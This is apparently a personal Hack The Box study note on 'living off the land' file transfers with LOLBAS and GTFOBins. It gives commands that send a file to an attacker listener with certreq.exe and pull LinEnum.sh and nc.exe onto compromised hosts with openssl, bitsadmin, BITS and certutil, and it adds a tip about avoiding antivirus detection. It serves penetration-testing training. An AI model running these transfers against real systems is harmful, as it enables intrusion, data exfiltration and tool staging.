---
title: "Living of the Land ( Binary Up/Downloads)"
date: 2024-03-28
summary: "LOLBAS for Windows and GTFOBins for Linux"
tags: ["file-transfer", "living-of-the-land-binary-up-downloads"]
source: "keepnote"
---

LOLBAS for Windows and GTFOBins for Linux

Search the sites f.e for upload/ddownload:

LOLBAS(Windows):
- Search for /upload or /download:

-
- https://lolbas-project.github.io/

-

For Upload f.e:
- Start NC listener on attacking machine:

-
- Momothechi@htb[/htb]$ sudo nc -lvnp 8000

- choose a /upload file, f.e. certreq.exe and execute it:

-
- C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini

if an error occures , maybe it doesnt support -Post / need to download updated version here:
- https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe

GTFOBins(Linux)
- Search for upload or download use:

-
- +file download or +file upload

- example with openssl since its most of the time installed:

- First we need to generate a certificate on our attacking machine:

-
- Momothechi@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

- Stand up the server on our attacking machine:

-
- Momothechi@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

- Download File from the Compromised Machine:

-
- Momothechi@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh

Bitsadmin:(used download files from HTTP and SMB shares)
- File Download:

-
- PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe

- Download:

-
- PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"

-

Certutil:
- Always installed on windows and is pretty much a wget for windows BUT it is almost always detected and flaagged by antivir for malicious actions so dont use:

-
- Download:

-
- C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
